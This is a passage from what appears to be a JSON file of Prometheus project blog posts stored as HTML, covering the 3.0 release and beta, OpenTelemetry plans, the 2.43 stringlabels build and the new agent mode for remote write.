guide</a> to find out if your setup is affected and what actions to take.</p>\n<h2>Performance</h2>\n<p>It’s impressive to see what we have accomplished in the community since Prometheus 2.0. We all love numbers, so let’s celebrate the efficiency improvements we made for both CPU and memory use for the TSDB mode. Below you can see performance numbers between 3 Prometheus versions on the node with 8 CPU and 49 GB allocatable memory.</p>\n<ul>\n<li>2.0.0 (7 years ago)</li>\n<li>2.18.0 (4 years ago)</li>\n<li>3.0.0 (now)</li>\n</ul>\n<p><img alt=\"Memory bytes\" src=\"https://prometheus.io/assets/blog/2024-11-14/memory_bytes_ui.png\" /></p>\n<p><img alt=\"CPU seconds\" src=\"https://prometheus.io/assets/blog/2024-11-14/cpu_seconds_ui.png\" /></p>\n<p>It’s furthermore impressive that those numbers were taken using our <a href=\"https://github.com/prometheus/prometheus/pull/15366\">prombench macrobenchmark</a>\nthat uses the same PromQL queries, configuration and environment–highlighting backward compatibility and stability for the core features, even with 3.0.</p>\n<h2>What's Next</h2>\n<p>There are still tons of exciting features and improvements we can make in Prometheus and the ecosystem. Here is a non-exhaustive list to get you excited and…\nhopefully motivate you to contribute and join us!</p>\n<ul>\n<li>New, more inclusive <strong>governance</strong></li>\n<li>More <strong>OpenTelemetry</strong> compatibility and features</li>\n<li>OpenMetrics 2.0, now under Prometheus governance!</li>\n<li>Native Histograms stability (and with custom buckets!)</li>\n<li>More optimizations!</li>\n<li>UTF-8 support coverage in more SDKs and tools</li>\n</ul>\n<h2>Try It Out!</h2>\n<p>You can try out Prometheus 3.0 by downloading it from our <a href=\"https://prometheus.io/download/#prometheus\">official binaries</a> and <a href=\"https://quay.io/repository/prometheus/prometheus?tab=tags\">container images</a>.</p>\n<p>If you are upgrading from Prometheus 2.x, check out the migration guide for more information on any adjustments you will have to make.\nPlease note that we strongly recommend upgrading to v2.55 before upgrading to v3.0. Rollback is possible from v3.0 to v2.55, but not to earlier versions.</p>\n<p>As always, we welcome feedback and contributions from the community!</p>",

      "summary": "<p>The Prometheus Team is proud to announce the availability of Prometheus Version 3.0-beta!\nYou can download it <a href=\"https://github.com/prometheus/prometheus/releases/tag/v3.0.0-beta.0\">here</a>.\nAs is traditional with a beta release, we do <strong>not</strong> recommend users install Prometheus 3.0-beta on critical production systems, but we do want everyone to test it out and find bugs.</p>\n<p>In general, the only breaking changes are the removal of deprecated feature flags. The Prometheus team worked hard to ensure backwards-compatibility and not to break existing installations, so all of the new features described below build on top of existing functionality. Most users should be able to try Prometheus 3.0 out of the box without any configuration changes.</p>\n<h2>What's New</h2>\n<p>With over 7500 commits in the 7 years since Prometheus 2.0 came out there are too many new individual features and fixes to list, but there are some big shiny and breaking changes we wanted to call out. We need everyone in the community to try them out and report any issues you might find.\nThe more feedback we get, the more stable the final 3.0 release can be.</p>\n<h3>New UI</h3>\n<p>One of the highlights in Prometheus 3.0 is its brand new UI that is enabled by default:</p>\n<p><img alt=\"New UI query page\" src=\"https://prometheus.io/assets/blog/2024-09-11/blog_post_screenshot_tree_view-s.png\" /></p>\n<p>The UI has been completely rewritten with less clutter, a more modern look and feel, new features like a <a href=\"https://promlens.com/\"><strong>PromLens</strong></a>-style tree view, and will make future maintenance easier by using a more modern technical stack.</p>\n<p>Learn more about the new UI in general in <a href=\"https://promlabs.com/blog/2024/09/11/a-look-at-the-new-prometheus-3-0-ui/\">Julius' detailed article on the PromLabs blog</a>.\nUsers can temporarily enable the old UI by using the <code>old-ui</code> feature flag.\nSince the new UI is not battle-tested yet, it is also very possible that there are still bugs. If you find any, please <a href=\"https://github.com/prometheus/prometheus/issues/new?assignees=&#x26;labels=&#x26;projects=&#x26;template=bug_report.yml\">report them on GitHub</a>.</p>\n<h3>Remote Write 2.0</h3>\n<p>Remote-Write 2.0 iterates on the previous protocol version by adding native support for a host of new elements including metadata, exemplars, created timestamp and native histograms. It also uses string interning to reduce payload size and CPU usage when compressing and decompressing. More details can be found <a href=\"https://prometheus.io/docs/specs/remote_write_spec_2_0/\">here</a>.</p>\n<h3>OpenTelemetry Support</h3>\n<p>Prometheus intends to be the default choice for storing OpenTelemetry metrics, and 3.0 includes some big new features that makes it even better as a storage backend for OpenTelemetry metrics data.</p>\n<h4>UTF-8</h4>\n<p>By default, Prometheus will allow all valid UTF-8 characters to be used in metric and label names, as well as label values as has been true in version 2.x.</p>\n<p>Users will need to make sure their metrics producers are configured to pass UTF-8 names, and if either side does not support UTF-8, metric names will be escaped using the traditional underscore-replacement method. PromQL queries can be written with the new quoting syntax in order to retrieve UTF-8 metrics, or users can specify the <code>__name__</code>  label name manually.</p>\n<p>Not all language bindings have been updated with support for UTF-8 but the primary Go libraries have been.</p>\n<h4>OTLP Ingestion</h4>\n<p>Prometheus can be configured as a native receiver for the OTLP Metrics protocol, receiving OTLP metrics on the /api/v1/otlp/v1/metrics endpoint.</p>\n<h3>Native Histograms</h3>\n<p>Native histograms are a Prometheus metric type that offer a higher efficiency and lower cost alternative to Classic Histograms. Rather than having to choose (and potentially have to update) bucket boundaries based on the data set, native histograms have pre-set bucket boundaries based on exponential growth.</p>\n<p>Native Histograms are still experimental and not yet enabled by default, and can be turned on by passing <code>--enable-feature=native-histograms</code>.  Some aspects of Native Histograms, like the text format and accessor functions / operators are still under active design.</p>\n<h3>Other Breaking Changes</h3>\n<p>The following feature flags have been removed, being enabled by default instead. References to these flags should be removed from configs, and will be ignored in Prometheus starting with version 3.0</p>\n<ul>\n<li><code>promql-at-modifier</code></li>\n<li><code>promql-negative-offset</code></li>\n<li><code>remote-write-receiver</code></li>\n<li><code>no-scrape-default-port</code></li>\n<li><code>new-service-discovery-manager</code></li>\n</ul>\n<p>Range selections are now <a href=\"https://github.com/prometheus/prometheus/issues/13213\">left-open and right-closed</a>, which will avoid rare occasions that more points than intended are included in operations.</p>\n<p>Agent mode is now stable and has its own config flag instead of a feature flag</p>",

      "summary": "<p><em>The <a href=\"https://opentelemetry.io/\">OpenTelemetry project</a> is an Observability framework and toolkit designed to create and manage telemetry data such as traces, metrics, and logs. It is gaining widespread adoption due to its consistent specification between signals and promise to reduce vendor lock-in which is something that we’re excited about.</em></p>\n<h2>Looking back at 2023</h2>\n<p>Over the past few years, we have collaborated with the OpenTelemetry community to make sure that OpenTelemetry and Prometheus support each other bidirectionally. This led to the drafting of the official specification to convert between the two systems, as well as the implementations that allow you to ingest Prometheus metrics into OpenTelemetry Collector and vice-versa.</p>\n<p>Since then, we have spent a significant amount of time understanding the <a href=\"https://docs.google.com/document/d/1epvoO_R7JhmHYsII-GJ6Yw99Ky91dKOqOtZGqX7Bk0g/edit?usp=sharing\">challenges faced by OpenTelemetry users</a> when storing their metrics in Prometheus and based on those, explored <a href=\"https://docs.google.com/document/d/1NGdKqcmDExynRXgC_u1CDtotz9IUdMrq2yyIq95hl70/edit?usp=sharing\">how we can address them</a>. Some of the changes proposed need careful considerations to avoid breaking either side's operating promises, e.g. supporting both push and pull. At PromCon Berlin 2023, we attempted to summarize our ideas in <a href=\"https://www.youtube.com/watch?v=mcabOH70FqU\">one of the talks</a>.</p>\n<p>At our <a href=\"https://docs.google.com/document/d/11LC3wJcVk00l8w5P3oLQ-m3Y37iom6INAMEu2ZAGIIE/edit#bookmark=id.9kp854ea3sv4\">dev summit in Berlin</a>, we spent the majority of our time discussing these changes and our general stance on OpenTelemetry in depth, and the broad consensus is that we want <a href=\"https://docs.google.com/document/d/11LC3wJcVk00l8w5P3oLQ-m3Y37iom6INAMEu2ZAGIIE/edit#bookmark=id.196i9ij1u7fs\">“to be the default store for OpenTelemetry metrics”</a>!</p>\n<p>We’ve formed a core group of developers to lead this initiative, and we are going to release a Prometheus 3.0 in 2024 with OTel support as one of its more important features. Here’s a sneak peek at what's coming in 2024.</p>\n<h2>The year ahead</h2>\n<h3>OTLP Ingestion GA</h3>\n<p>In <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.47.0\">Prometheus v2.47.0</a>, released on 6th September 2023, we added experimental support for OTLP ingestion in Prometheus. We’re constantly improving this and we plan to add support for staleness and make it a stable feature. We will also mark our support for out-of-order ingestion as stable. This involves also GA-ing our support for native / exponential histograms.</p>\n<h3>Support UTF-8 metric and label names</h3>\n<p><a href=\"https://github.com/open-telemetry/semantic-conventions/blob/main/docs/http/http-metrics.md\">OpenTelemetry semantic conventions</a> push for <code>“.”</code> to be the namespacing character. For example, <code>http.server.request.duration</code>. However, Prometheus currently requires a <a href=\"https://prometheus.io/docs/instrumenting/writing_exporters/#naming\">more limited character set</a>, which means we convert the metric to <code>http_server_request_duration</code> when ingesting it into Prometheus.</p>\n<p>This causes unnecessary dissonance and we’re working on removing this limitation by adding UTF-8 support for all labels and metric names. The progress is tracked <a href=\"https://github.com/prometheus/prometheus/issues/13095\">here</a>.</p>\n<h3>Native support for resource attributes</h3>\n<p>OpenTelemetry differentiates between metric attributes (labels to identify the metric itself, like <code>http.status_code</code>) and resource attributes (labels to identify the source of the metrics, like <code>k8s.pod.name</code>), while Prometheus has a more flat label schema. This leads to many usability issues that are detailed <a href=\"https://docs.google.com/document/d/1gG-eTQ4SxmfbGwkrblnUk97fWQA93umvXHEzQn2Nv7E/edit?usp=sharing\">here</a>.</p>\n<p>We’re <a href=\"https://docs.google.com/document/d/1FgHxOzCQ1Rom-PjHXsgujK8x5Xx3GTiwyG__U3Gd9Tw/edit\">exploring several solutions</a> to this problem from many fronts (Query, UX, storage, etc.), but our goal is to make it quite easy to filter and group on resource attributes. This is a work in progress, and feedback and help are wanted!</p>\n<h3>OTLP export in the ecosystem</h3>\n<p>Prometheus remote write is supported by <a href=\"https://prometheus.io/docs/operating/integrations/#remote-endpoints-and-storage\">most of the leading Observability projects and vendors</a> already. However, OpenTelemetry Protocol (OTLP) is gaining prominence and we would like to support it across the Prometheus ecosystem.</p>\n<p>We would like to add support for it to the Prometheus server, SDKs and the exporters. This would mean that any service instrumented with the Prometheus SDKs will also be able to <em>push</em> OTLP and it will unlock the rich Prometheus exporter ecosystem for OpenTelemetry users.</p>\n<p>However, we intend to keep and develop the OpenMetrics exposition format as an optimized / simplified format for Prometheus and pull-based use-cases.</p>\n<h3>Delta temporality</h3>\n<p>The OpenTelemetry project also supports <a href=\"https://grafana.com/blog/2023/09/26/opentelemetry-metrics-a-guide-to-delta-vs.-cumulative-temporality-trade-offs/\">Delta temporality</a> which has some use-cases for the Observability ecosystem. We have a lot of Prometheus users still running statsd and using the statsd_exporter for various reasons.</p>\n<p>We would like to support the Delta temporality of OpenTelemetry in the Prometheus server and are <a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/issues/30479\">working towards it</a>.</p>\n<h2>Call for contributions!</h2>\n<p>As you can see, a lot of new and exciting things are coming to Prometheus! If working in the intersection between two of the most relevant open-source projects around observability sounds challenging and interesting to you, we'd like to have you on board!</p>\n<p>This year there is also a change of governance in the works that will make the process of becoming a maintainer easier than ever! If you ever wanted to have an impact on Prometheus, now is a great time to get started.</p>\n<p>Our first focus has always been to be as open and transparent as possible on how we are organizing all the work above so that you can also contribute. We are looking for contributors to support this initiative and help implement these features. Check out the <a href=\"https://github.com/orgs/prometheus/projects/9\">Prometheus 3.0 public board</a> and <a href=\"https://github.com/prometheus/prometheus/issues?q=is%3Aopen+is%3Aissue+milestone%3A%22OTEL+Support%22\">Prometheus OTel support milestone</a> to track the progress of the feature development and see ways that you can <a href=\"https://github.com/prometheus/prometheus/blob/main/CONTRIBUTING.md\">contribute</a>.</p>\n<h2>Conclusion</h2>\n<p>Some of the changes proposed are large and invasive or involve a fundamental departure from the original data model of Prometheus. However, we plan to introduce these gracefully so that Prometheus 3.0 will have no major breaking changes and most of the users can upgrade without impact.</p>\n<p>We are excited to embark on this new chapter for Prometheus and would love your feedback on the changes suggested.</p>",

      "summary": "<p>Prometheus 2.43 has just been released, and it brings some exciting features and\nenhancements. One of the significant improvements is the <code>stringlabels</code> release,\nwhich uses a new data structure for labels. This blog post will answer some\nfrequently asked questions about the 2.43 release and the <code>stringlabels</code>\noptimizations.</p>\n<h2>What is the <code>stringlabels</code> release?</h2>\n<p>The <code>stringlabels</code> release is a Prometheus 2.43 version that uses a new data\nstructure for labels. It stores all the label/values in a single string,\nresulting in a smaller heap size and some speedups in most cases. These\noptimizations are not shipped in the default binaries and require compiling\nPrometheus using the Go tag <code>stringlabels</code>.</p>\n<h2>Why didn't you go for a feature flag that we can toggle?</h2>\n<p>We considered using a feature flag but it would have a memory overhead that was\nnot worth it. Therefore, we decided to provide a separate release with these\noptimizations for those who are interested in testing and measuring the gains on\ntheir production environment.</p>\n<h2>When will these optimizations be generally available?</h2>\n<p>These optimizations will be available in the upcoming Prometheus 2.44 release\nby default.</p>\n<h2>How do I get the 2.43 release?</h2>\n<p>The <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.43.0\">Prometheus 2.43 release</a> is available on the official Prometheus GitHub\nreleases page, and users can download the binary files directly from there.\nAdditionally, Docker images are also available for those who prefer to use\ncontainers.</p>\n<p>The stringlabels optimization is not included in these default binaries. To use\nthis optimization, users will need to download the <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.43.0%2Bstringlabels\">2.43.0+stringlabels\nrelease</a>\nbinary or the <a href=\"https://quay.io/repository/prometheus/prometheus?tab=tags\">Docker images tagged\nv2.43.0-stringlabels</a> specifically.</p>\n<h2>Why is the release <code>v2.43.0+stringlabels</code> and the Docker tag <code>v2.43.0-stringlabels</code>?</h2>\n<p>In semantic versioning, the plus sign (+) is used to denote build\nmetadata. Therefore, the Prometheus 2.43 release with the <code>stringlabels</code>\noptimization is named <code>2.43.0+stringlabels</code> to signify that it includes the\nexperimental <code>stringlabels</code> feature. However, Docker tags do not allow the use of\nthe plus sign in their names. Hence, the plus sign has been replaced with a dash\n(-) to make the Docker tag <code>v2.43.0-stringlabels</code>. This allows the Docker tag to\npass the semantic versioning checks of downstream projects such as the\nPrometheus Operator.</p>\n<h2>What are the other noticeable features in the Prometheus 2.43 release?</h2>\n<p>Apart from the <code>stringlabels</code> optimizations, the Prometheus 2.43 release\nbrings several new features and enhancements. Some of the significant additions\ninclude:</p>\n<ul>\n<li>We added support for <code>scrape_config_files</code> to include scrape configs from\ndifferent files. This makes it easier to manage and organize the configuration.</li>\n<li>The HTTP clients now includes two new config options: <code>no_proxy</code> to exclude\nURLs from proxied requests and <code>proxy_from_environment</code> to read proxies from\nenv variables. These features make it easier to manage the HTTP client's\nbehavior in different environments.</li>\n</ul>\n<p>You can learn more about features and bugfixes in the\n<a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.43.0\">full changelog</a>.</p>",

CNCF Ambassador and tech lead for the CNCF TAG Observability. In his free time, he writes a book titled \"Efficient Go\" with O'Reilly. Opinions are my own!</p>\n</blockquote>\n<p>What I personally love in the Prometheus project, and one of the many reasons why I joined the team, was the laser focus on the project's goals. Prometheus was always about pushing boundaries when it comes to providing pragmatic, reliable, cheap, yet invaluable metric-based monitoring. Prometheus' ultra-stable and robust APIs, query language, and integration protocols (e.g. Remote Write and <a href=\"https://openmetrics.io/\">OpenMetrics</a>) allowed the Cloud Native Computing Foundation (CNCF) metrics ecosystem to grow on those strong foundations. Amazing things happened as a result:</p>\n<ul>\n<li>We can see community exporters for getting metrics about virtually everything e.g. <a href=\"https://github.com/google/cadvisor\">containers</a>, <a href=\"https://github.com/cloudflare/ebpf_exporter\">eBPF</a>, <a href=\"https://github.com/sladkoff/minecraft-prometheus-exporter\">Minecraft server statistics</a> and even <a href=\"https://megamorf.gitlab.io/2019/07/14/monitoring-plant-health-with-prometheus/\">plants' health when gardening</a>.</li>\n<li>Most people nowadays expect cloud-native software to have an HTTP/HTTPS <code>/metrics</code> endpoint that Prometheus can scrape. A concept developed in secret within Google and pioneered globally by the Prometheus project.</li>\n<li>The observability paradigm shifted. We see SREs and developers rely heavily on metrics from day one, which improves software resiliency, debuggability, and data-driven decisions!</li>\n</ul>\n<p>In the end, we hardly see Kubernetes clusters without Prometheus running there.</p>\n<p>The strong focus of the Prometheus community allowed other open-source projects to grow too to extend the Prometheus deployment model beyond single nodes (e.g. <a href=\"https://cortexmetrics.io/\">Cortex</a>, <a href=\"https://thanos.io/\">Thanos</a> and more). Not mentioning cloud vendors adopting Prometheus' API and data model (e.g. <a href=\"https://aws.amazon.com/prometheus/\">Amazon Managed Prometheus</a>, <a href=\"https://cloud.google.com/stackdriver/docs/managed-prometheus\">Google Cloud Managed Prometheus</a>, <a href=\"https://grafana.com/products/cloud/\">Grafana Cloud</a> and more). If you are looking for a single reason why the Prometheus project is so successful, it is this: <strong>Focusing the monitoring community on what matters</strong>.</p>\n<p>In this (lengthy) blog post, I would love to introduce a new operational mode of running Prometheus called \"Agent\". It is built directly into the Prometheus binary. The agent mode disables some of Prometheus' usual features and optimizes the binary for scraping and remote writing to remote locations. Introducing a mode that reduces the number of features enables new usage patters. In this blog post I will explain why it is a game-changer for certain deployments in the CNCF ecosystem. I am super excited about this!</p>\n<h2>History of the Forwarding Use Case</h2>\n<p>The core design of Prometheus has been unchanged for the project's entire lifetime. Inspired by <a href=\"https://sre.google/sre-book/practical-alerting/#the-rise-of-borgmon\">Google's Borgmon monitoring system</a>, you can deploy a Prometheus server alongside the applications you want to monitor, tell Prometheus how to reach them, and allow to scrape the current values of their metrics at regular intervals. Such a collection method, which is often referred to as the \"pull model\", is the core principle that <a href=\"https://prometheus.io/blog/2016/07/23/pull-does-not-scale-or-does-it/\">allows Prometheus to be lightweight and reliable</a>. Furthermore, it enables application instrumentation and exporters to be dead simple, as they only need to provide a simple human-readable HTTP endpoint with the current value of all tracked metrics (in OpenMetrics format). All without complex push infrastructure and non-trivial client libraries. Overall, a simplified typical Prometheus monitoring deployment looks as below:</p>\n<p><img alt=\"Prometheus high-level view\" src=\"https://prometheus.io/assets/blog/2021-11-16/prom.png\" /></p>\n<p>This works great, and we have seen millions of successful deployments like this over the years that process dozens of millions of active series. Some of them for longer time retention, like two years or so. All allow to query, alert, and record metrics useful for both cluster admins and developers.</p>\n<p>However, the cloud-native world is constantly growing and evolving. With the growth of managed Kubernetes solutions and clusters created on-demand within seconds, we are now finally able to treat clusters as \"cattle\", not as \"pets\" (in other words, we care less about individual instances of those). In some cases, solutions do not even have the cluster notion anymore, e.g. <a href=\"https://github.com/kcp-dev/kcp\">kcp</a>, <a href=\"https://aws.amazon.com/fargate/\">Fargate</a> and other platforms.</p>\n<p><img alt=\"Yoda\" src=\"https://prometheus.io/assets/blog/2021-11-16/yoda.gif\" /></p>\n<p>The other interesting use case that emerges is the notion of <strong>Edge</strong> clusters or networks. With industries like telecommunication, automotive and IoT devices adopting cloud-native technologies, we see more and more much smaller clusters with a restricted amount of resources. This is forcing all data (including observability) to be transferred to remote, bigger counterparts as almost nothing can be stored on those remote nodes.</p>\n<p>What does that mean? That means monitoring data has to be somehow aggregated, presented to users and sometimes even stored on the <em>global</em> level. This is often called a <strong>Global-View</strong> feature.</p>\n<p>Naively, we could think about implementing this by either putting Prometheus on that global level and scraping metrics across remote networks or pushing metrics directly from the application to the central location for monitoring purposes. Let me explain why both are generally <em>very</em> bad ideas:</p>\n<p>🔥 Scraping across network boundaries can be a challenge if it adds new unknowns in a monitoring pipeline. The local pull model allows Prometheus to know why exactly the metric target has problems and when. Maybe it's down, misconfigured, restarted, too slow to give us metrics (e.g. CPU saturated), not discoverable by service discovery, we don't have credentials to access or just DNS, network, or the whole cluster is down. By putting our scraper outside of the network, we risk losing some of this information by introducing unreliability into scrapes that is unrelated to an individual target. On top of that, we risk losing important visibility completely if the network is temporarily down. Please don't do it. It's not worth it. (:</p>\n<p>🔥 Pushing metrics directly from the application to some central location is equally bad. Especially when you monitor a larger fleet, you know literally nothing when you don't see metrics from remote applications. Is the application down? Is my receiver pipeline down? Maybe the application failed to authorize? Maybe it failed to get the IP address of my remote cluster? Maybe it's too slow? Maybe the network is down? Worse, you may not even know that the data from some application targets is missing. And you don't even gain a lot as you need to track the state and status of everything that should be sending data. Such a design needs careful analysis as it can be a recipe for a failure too easily.</p>\n<blockquote>\n<p>NOTE: Serverless functions and short-living containers are often cases where we think about push from application as the rescue. At this point however we talk about events or pieces of metrics we might want to aggregate to longer living time series. This topic is discussed <a href=\"https://groups.google.com/g/prometheus-developers/c/FPe0LsTfo2E/m/yS7up2YzAwAJ\">here</a>, feel free to contribute and help us support those cases better!</p>\n</blockquote>\n<p>Prometheus introduced three ways to support the global view case, each with its own pros and cons. Let's briefly go through those. They are shown in orange color in the diagram below:</p>\n<p><img alt=\"Prometheus global view\" src=\"https://prometheus.io/assets/blog/2021-11-16/prom-remote.png\" /></p>\n<ul>\n<li><strong>Federation</strong> was introduced as the first feature for aggregation purposes. It allows a global-level Prometheus server to scrape a subset of metrics from a leaf Prometheus. Such a \"federation\" scrape reduces some unknowns across networks because metrics exposed by federation endpoints include the original samples' timestamps. Yet, it usually suffers from the inability to federate all metrics and not lose data during longer network partitions (minutes).</li>\n<li><strong>Prometheus Remote Read</strong> allows selecting raw metrics from a remote Prometheus server's database without a direct PromQL query. You can deploy Prometheus or other solutions (e.g. Thanos) on the global level to perform PromQL queries on this data while fetching the required metrics from multiple remote locations. This is really powerful as it allows you to store data \"locally\" and access it only when needed. Unfortunately, there are cons too. Without features like <a href=\"https://github.com/thanos-io/thanos/issues/305\">Query Pushdown</a> we are in extreme cases pulling GBs of compressed metric data to answer a single query. Also, if we have a network partition, we are temporarily blind. Last but not least, certain security guidelines are not allowing ingress traffic, only egress one.</li>\n<li>Finally, we have <strong>Prometheus Remote Write</strong>, which seems to be the most popular choice nowadays. Since the agent mode focuses on remote write use cases, let's explain it in more detail.</li>\n</ul>\n<h3>Remote Write</h3>\n<p>The Prometheus Remote Write protocol allows us to forward (stream) all or a subset of metrics collected by Prometheus to the remote location. You can configure Prometheus to forward some metrics (if you want, with all metadata and exemplars!) to one or more locations that support the Remote Write API. In fact, Prometheus supports both ingesting and sending Remote Write, so you can deploy Prometheus on a global level to receive that stream and aggregate data cross-cluster.</p>\n<p>While the official <a href=\"https://docs.google.com/document/d/1LPhVRSFkGNSuU1fBd81ulhsCPR4hkSZyyBj1SZ8fWOM/edit\">Prometheus Remote Write API specification is in review stage</a>, the ecosystem adopted the Remote Write protocol as the default metrics export protocol. For example, Cortex, Thanos, OpenTelemetry, and cloud services like Amazon, Google, Grafana, Logz.io, etc., all support ingesting data via Remote Write.</p>\n<p>The Prometheus project also offers the official compliance tests for its APIs, e.g. <a href=\"https://github.com/prometheus/compliance/tree/main/remote_write_sender\">remote-write sender compliance</a> for solutions that offer Remote Write client capabilities. It's an amazing way to quickly tell if you are correctly implementing this protocol.</p>\n<p>Streaming data from such a scraper enables Global View use cases by allowing you to store metrics data in a centralized location. This also enables separation of concerns, which is useful when applications are managed by different teams than the observability or monitoring pipelines. Furthermore, it is also why Remote Write is chosen by vendors who want to offload as much work from their customers as possible.</p>\n<blockquote>\n<p>Wait for a second, Bartek. You just mentioned before that pushing metrics directly from the application is not the best idea!</p>\n</blockquote>\n<p>Sure, but the amazing part is that, even with Remote Write, Prometheus still uses a pull model to gather metrics from applications, which gives us an understanding of those different failure modes. After that, we batch samples and series and export, replicate (push) data to the Remote Write endpoints, limiting the number of monitoring unknowns that the central point has!</p>\n<p>It's important to note that a reliable and efficient remote-writing implementation is a non-trivial problem to solve. The Prometheus community spent around three years to come up with a stable and scalable implementation. We reimplemented the WAL (write-ahead-log) a few times, added internal queuing, sharding, smart back-offs and more. All of this is hidden from the user, who can enjoy well-performing streaming or large amounts of metrics stored in a centralized location.</p>\n<h3>Hands-on Remote Write Example: Katacoda Tutorial</h3>\n<p>All of this is not new in Prometheus. Many of us already use Prometheus to scrape all required metrics and remote-write all or some of them to remote locations.</p>\n<p>Suppose you would like to try the hands-on experience of remote writing capabilities. In that case, we recommend the <a href=\"https://katacoda.com/thanos/courses/thanos/3-receiver\">Thanos Katacoda tutorial of remote writing metrics from Prometheus</a>, which explains all steps required for Prometheus to forward all metrics to the remote location. It's <strong>free</strong>, just sign up for an account and enjoy the tutorial! 🤗</p>\n<p>Note that this example uses Thanos in receive mode as the remote storage. Nowadays, you can use plenty of other projects that are compatible with the remote write API.</p>\n<p>So if remote writing works fine, why did we add a special Agent mode to Prometheus?</p>\n<h2>Prometheus Agent Mode</h2>\n<p>From Prometheus <code>v2.32.0</code> (next release), everyone will be able to run the Prometheus binary with an experimental <code>--enable-feature=agent</code> flag. If you want to try it before the release, feel free to use <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.32.0-beta.0\">Prometheus v2.32.0-beta.0</a> or use our <code>quay.io/prometheus/prometheus:v2.32.0-beta.0</code> image.</p>\n<p>The Agent mode optimizes Prometheus for the remote write use case. It disables querying, alerting, and local storage, and replaces it with a customized TSDB WAL. Everything else stays the same: scraping logic, service discovery and related configuration. It can be used as a drop-in replacement for Prometheus if you want to just forward your data to a remote Prometheus server or any other Remote-Write-compliant project. In essence it looks like this:</p>\n<p><img alt=\"Prometheus agent\" src=\"https://prometheus.io/assets/blog/2021-11-16/agent.png\" /></p>\n<p>The best part about Prometheus Agent is that it's built into Prometheus. Same scraping APIs, same semantics, same configuration and discovery mechanism.</p>\n<p>What are the benefits of using the Agent mode if you plan not to query or alert on data locally and stream metrics outside? There are a few:</p>\n<p>First of all, efficiency. Our customized Agent TSDB WAL removes the data immediately after successful writes. If it cannot reach the remote endpoint, it persists the data temporarily on the disk until the remote endpoint is back online. This is currently limited to a two-hour buffer only, similar to non-agent Prometheus, <a href=\"https://github.com/prometheus/prometheus/issues/9607\">hopefully unblocked soon</a>. This means that we don't need to build chunks of data in memory. We don't need to maintain a full index for querying purposes. Essentially the Agent mode uses a fraction of the resources that a normal Prometheus server would use in a similar situation.</p>\n<p>Does this efficiency matter? Yes! As we mentioned, every GB of memory and every CPU core used on edge clusters matters for some deployments. On the other hand, the paradigm of performing monitoring using metrics is quite mature these days. This means that the more relevant metrics with more cardinality you can ship for the same cost - the better.</p>\n<blockquote>\n<p>NOTE: With the introduction of the Agent mode, the original Prometheus server mode still stays as the recommended, stable and maintained mode. Agent mode with remote storage brings additional complexity. Use with care.</p>\n</blockquote>\n<p>Secondly, the benefit of the new Agent mode is that it enables easier horizontal scalability for ingestion. This is something I am excited about the most. Let me explain why.</p>\n<h3>The Dream: Auto-Scalable Metric Ingestion</h3>\n<p>A true auto-scalable solution for scraping would need to be based on the amount of metric targets and the number of metrics they expose. The more data we have to scrape, the more instances of Prometheus we deploy automatically. If the number of targets or their number of metrics goes down, we could scale down and remove a couple of instances. This would remove the manual burden of adjusting the sizing of Prometheus and stop the need for over-allocating Prometheus for situations where the cluster is temporarily small.</p>\n<p>With just Prometheus in server mode, this was hard to achieve. This is because Prometheus in server mode is stateful. Whatever is collected stays as-is in a single place. This means that the scale-down procedure would need to back up the collected data to existing instances before termination. Then we would have the problem of overlapping scrapes, misleading staleness markers etc.</p>\n<p>On top of that, we would need some global view query that is able to aggregate all samples across all instances (e.g. Thanos Query or Promxy). Last but not least, the resource usage of Prometheus in server mode depends on more things than just ingestion. There is alerting, recording, querying, compaction, remote write etc., that might need more or fewer resources independent of the number of metric targets.</p>\n<p>Agent mode essentially moves the discovery, scraping and remote writing to a separate microservice. This allows a focused operational model on ingestion only. As a result, Prometheus in Agent mode is more or less stateless. Yes, to avoid loss of metrics, we need to deploy an HA pair of agents and attach a persistent disk to them. But technically speaking, if we have thousands of metric targets (e.g. containers), we can deploy multiple Prometheus agents and safely change which replica is scraping which targets. This is because, in the end, all samples will be pushed to the same central storage.</p>\n<p>Overall, Prometheus in Agent mode enables easy horizontal auto-scaling capabilities of Prometheus-based scraping that can react to dynamic changes in metric targets. This is definitely something we will look at with the <a href=\"https://github.com/prometheus-operator/prometheus-operator\">Prometheus Kubernetes Operator</a> community going forward.</p>\n<p>Now let's take a look at the currently implemented state of agent mode in Prometheus. Is it ready to use?</p>\n<h3>Agent Mode Was Proven at Scale</h3>\n<p>The next release of Prometheus will include Agent mode as an experimental feature. Flags, APIs and WAL format on disk might change. But the performance of the implementation is already battle-tested thanks to <a href=\"https://grafana.com/\">Grafana Labs'</a> open-source work.</p>\n<p>The initial implementation of our Agent's custom WAL was inspired by the current Prometheus server's TSDB WAL and created by <a href=\"https://github.com/rfratto\">Robert Fratto</a> in 2019, under the mentorship of <a href=\"https://twitter.com/tom_wilkie\">Tom Wilkie</a>, Prometheus maintainer. It was then used in an open-source <a href=\"https://github.com/grafana/agent\">Grafana Agent</a> project that was since then used by many Grafana Cloud customers and community members. Given the maturity of the solution, it was time to donate the implementation to Prometheus for native integration and bigger adoption. Robert (Grafana Labs), with the help of Srikrishna (Red Hat) and the community, ported the code to the Prometheus codebase, which was merged to <code>main</code> 2 weeks ago!</p>\n<p>The donation process was quite smooth. Since some Prometheus maintainers contributed to this code before within the Grafana Agent, and since the new WAL is inspired by Prometheus' own WAL, it was not hard for the current Prometheus TSDB maintainers to take it under full maintenance! It also really helps that Robert is joining the Prometheus Team as a TSDB maintainer (congratulations!).</p>\n<p>Now, let's explain how you can use it! (:</p>\n<h3>How to Use Agent Mode in Detail</h3>\n<p>From now on, if you show the help output of Prometheus (<code>--help</code> flag), you should see more or less the following:</p>\n<pre><code class=\"language-bash\">usage: prometheus [&#x3c;flags>]\n\nThe Prometheus monitoring server\n\nFlags:\n  -h, --help                     Show context-sensitive help (also try --help-long and --help-man).\n      (... other flags)\n      --storage.tsdb.path=\"data/\"\n                                 Base path for metrics storage. Use with server mode only.\n      --storage.agent.path=\"data-agent/\"\n                                 Base path for metrics storage. Use with agent mode only.\n      (... other flags)\n      --enable-feature= ...      Comma separated feature names to enable. Valid options: agent, exemplar-storage, expand-external-labels, memory-snapshot-on-shutdown, promql-at-modifier, promql-negative-offset, remote-write-receiver,\n                                 extra-scrape-metrics, 